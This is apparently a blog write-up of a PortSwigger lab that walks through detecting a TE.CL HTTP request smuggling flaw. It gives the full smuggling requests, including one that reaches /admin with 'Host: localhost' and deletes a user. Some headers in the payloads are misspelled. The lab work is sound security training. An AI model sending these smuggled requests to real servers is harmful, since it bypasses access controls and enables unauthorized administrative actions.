---
title: " PortSwiggerlabs: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability"
date: 2026-07-03 00:00:00 +0000
categories: [PortSwiggerLabs , HTTP Request Smuggling ]
tags: [PortSwiggerLabs , HTTP Request Smuggling , Challenge , Web_Attacks ]
---


## Information : 

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.


## Solution : 

Quick note:

HTTP Request Smuggling happens because of a disagreement between servers. In a typical setup you have a front-end (proxy, load balancer, CDN) forwarding requests to a back-end, and they share persistent TCP connections. The issue is that HTTP gives two ways to tell a server where a request body ends: Content-Length, which just counts bytes, and Transfer-Encoding: chunked, which sends the body in chunks ending with a zero-size chunk. When both headers are present in the same request, different servers may prioritize differently and that gap is what we exploit.

The idea is: you craft a request the front-end considers complete and forwards normally, but the back-end reads it differently and treats part of your body as leftover data sitting in the TCP buffer. That leftover then gets prepended to the next incoming request — yours or another user's. That's how you end up bypassing access controls, hijacking requests, or poisoning responses.

The three main variants are CL.TE, TE.CL, and TE.TE , basically which server trusts which header, or in the TE.TE case, how you obfuscate the Transfer-Encoding header enough that one server just ignores it entirely.

Before jumping into Burp, two things worth knowing: first, disable Update Content-Length in Repeater options , if Burp auto corrects your Content-Length you're defeating the whole point. Second, make sure you're sending over HTTP/1, not HTTP/2. When testing manually, timing delays are your main signal if the response hangs after your crafted request, the back-end is likely waiting for data that isn't coming, which means it's parsing things differently from the front-end. That's your confirmation.

Now back to the lab:

<img width="1576" height="781" alt="image" src="https://github.com/user-attachments/assets/3ca025f7-fb73-42a4-9960-8aeb5bdb95ca" />

Now first thing first, we need to determine what both the front end and the backend are using , we do that by sending a specific request and based on the response we will determine whether we have a CL.TE , TE.CL , TE.TE .

I like to use this graph from **Jarno Timmermans** : 

<img width="1859" height="934" alt="image" src="https://github.com/user-attachments/assets/9a90be80-cfa7-4f38-921c-dffcba4b90b2" />

But you can use this guide from HackerReciepe : 

```bash
https://www.thehacker.recipes/web/config/http-request-smuggling/#practice
```

Now first we send a specific request , that based on the response we will know if the backend and front end trust different Headers :

- First Downgrade the request to HTTP1.1/
- Then We change the request Method to POST 
- Then Remove Auto Length
- Add Transfer-Encoding: chunked
- Show Non-printable characters , this will be helpful when it comes to counting Bytes .
- In the Boy , add 

```bash
Content-Lenght: 6
Transfer-Encoding: chunked

1
123
X
# The \r\n are just line separators (We can easily show them using burp) . 
```

<img width="1321" height="560" alt="image" src="https://github.com/user-attachments/assets/b5cb1ec0-272d-4385-997b-de1aac0b9af9" />

Now if we send this request , either we will get a timeout , in this case we have a CE.TL, or we get an error , which means the Frontend is definetly using TE and since we didn't send a terminating character , it won't be accepted by the front end since the request wasn't terminated.

<img width="1337" height="507" alt="image" src="https://github.com/user-attachments/assets/b0aa6764-c26c-4d8b-9372-172857601559" />

Now to determine what the backend uses, we should send the second request : 

```bash
Content-Lenght: 6
Transfer-Encoding: chunked

0

X
```

<img width="1348" height="541" alt="image" src="https://github.com/user-attachments/assets/d08c6184-c519-4e77-ae60-0a8add8bb82f" />

We got a timeout , which means the server expects the last Byte , and since the frontend already ended the request after the terminating character , the last byte will never get forwarded to the server :

So this is a high indicator that we have a TE.CL .

To confirm it :

In our case , the TE.CL can be explained using this graph from **Jarno Timmermans** again : 

<img width="1667" height="1008" alt="image" src="https://github.com/user-attachments/assets/051dacc9-f420-4ced-9a8f-c11c93d3b71f" />

- The orange part in the graph is exactly what was stored in the buffer when sending the first request . Since we know the server uses CL , we can specify it to be 4 , and from there have the rest of the request stored in the buffer so that it gets appended to the next request (normal request).

- The appended request has 15 in the CL , while the entire request stored in the buffer has 10 bytes,  which means only 5 bytes of the normal request will be appended , that's exactly "GET /"  and the rest will be ignored .

Now first we need the Attack Request : 

```bash
POST / HTTP/1.1
Host: 0ae800c703d22723817966ca004f0089.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Trasnfer-Encoding: chunked
Content-Length: 'Not_Defined_yet'

<Chunk_Size_Not_Defined_Yet>
POST /throws404 HTTP/1.1
Host: 0ae800c703d22723817966ca004f0089.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 'Not_Defined_yet'

x=1
0

```

- Now for the First Conten-Length of the smuggled request , we just need it to be bigger than the actual request so that the normal request we make gets appended to it .

<img width="1864" height="578" alt="image" src="https://github.com/user-attachments/assets/6c53b3dd-9f53-47a7-ad06-9f63d25b38bf" />

Here we see that it is 10 bytes so using 15 will work just fine . 

- For the Chunked Size , we can use Burp Inspector once again :

<img width="1874" height="633" alt="image" src="https://github.com/user-attachments/assets/b6fd38bc-59d5-43be-b863-859910555cd6" />

Perfect we see that the HEX value is a5 . so that is our chunked size : 

- Finally for the entire request , the content length should be the Bytes we have before the smuggled request , since that's what we want to send to the server , the rest we need it to go to the buffer :

<img width="1882" height="438" alt="image" src="https://github.com/user-attachments/assets/28dc7dbf-a205-4db7-a280-1732a5692d86" />

Perfect so our Final attack request should look like this : 

```bash
POST / HTTP/1.1
Host: 0a71007104c55597801853f50027000d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

a5
POST /throws404 HTTP/1.1
Host: 0a71007104c55597801853f50027000d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Since we want the entire request to be forwarded to the backend , we added the terminating character at the end (0\r\n) , Of course make sure you disable Auto update for the content-length otherwise the entire request will be processed by the backend , we only want the 4 first Bytes. 

<img width="1647" height="678" alt="image" src="https://github.com/user-attachments/assets/bd829d02-0af0-46bd-83fe-fda8bcfcc2b7" />

Perfect , now all we need to do is send a normal request that should normally return a 200 , but if our request was smuggled it will return 404 since the /Throws404 doesn't exist . 

<img width="1513" height="645" alt="image" src="https://github.com/user-attachments/assets/aa5f6513-4c72-4539-a82c-0077ca5a7793" />

Perfect , our request was smuggled :)

Now all we need to do is instead of the /throw404 , we specify the admin endpoint , that way we can bypass the front end restrictions . 

Of course we will need to modify the chunked size of the request , use Burp Inspector for this , the chunk size starts from POST .... to the x=1 without including the \r\n .

<img width="1914" height="717" alt="image" src="https://github.com/user-attachments/assets/21aa9a71-3810-446c-a3d4-97734afbeb4b" />

Now if we send it , we get a 200 . 

After that we send our normal request , which by default will get appended to the smuggled request inside the Buffer that will access the admin endpoint and ignore the rest or the request . 

<img width="1525" height="729" alt="image" src="https://github.com/user-attachments/assets/8756ae73-d8b0-4bd3-b95f-85db458c0853" />

We get an unauthorized , on the good side our request was smuggled , now we just need to bypass the restriction . 

We can add a Host header , and specify it to be Localhost , since it will look like it's coming from the server itself , it should bypass it . 

<img width="1378" height="576" alt="image" src="https://github.com/user-attachments/assets/f6ab5aaa-c33a-4d9c-b066-5dde0de00124" />

Of course we will have to modify the Chunked size . 

<img width="1891" height="602" alt="image" src="https://github.com/user-attachments/assets/c1e75025-e395-4571-b828-9b6e93274ff4" />

I kept trying with this request but it didn't work , but once i removed the other Host header it worked perfectly (Make sure you modify the chunked size whenever you change something in the smuggled request):

```bash
POST / HTTP/1.1
Host: 0a71007104c55597801853f50027000d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

<img width="1528" height="554" alt="image" src="https://github.com/user-attachments/assets/d243d96f-4a3e-43f7-9d2e-d923efa326fc" />

Now from there we just send a normal request , and we should get access to the admin pannel :

<img width="1586" height="568" alt="image" src="https://github.com/user-attachments/assets/d5dcbc96-5f1a-41c8-8eed-c23d7f872d3f" />

And we do , now to delete carlos , we can read the source code to see what the redirection for it is : 

<img width="1490" height="679" alt="image" src="https://github.com/user-attachments/assets/8324c31d-86f2-4f3a-bc78-f0de9851fdc9" />

Finally we just modify the request to include this endpoint instead : 

<img width="1878" height="643" alt="image" src="https://github.com/user-attachments/assets/d1d0c2d0-1b6a-4925-b0c5-7f4c0b22a4ba" />

Now if we send a normal request : 

<img width="1573" height="514" alt="image" src="https://github.com/user-attachments/assets/8400d75e-71b3-41a0-8857-2d6f14e502eb" />

We get a redirection , which means we were able to delete the user , if we go back to the lab , we should see that it was solved . 

<img width="1736" height="619" alt="image" src="https://github.com/user-attachments/assets/e4c23ae8-e6f3-4697-a933-2f86294a77dd" />

That was all for this lab , see you in the next one :)
